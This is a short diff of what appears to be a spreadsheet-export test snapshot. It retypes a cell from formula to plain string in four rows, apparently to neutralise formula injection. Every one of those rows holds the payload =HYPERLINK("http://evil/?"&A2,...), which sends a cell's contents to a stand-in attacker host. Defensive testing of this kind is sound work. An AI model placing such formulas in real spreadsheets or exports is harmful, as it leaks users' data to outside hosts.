@@ -41,7 +41,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice0@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00004'",
@@ -121,7 +121,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice12@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00016'",
@@ -185,7 +185,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice24@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00028'",
@@ -249,7 +249,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice36@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00040'",
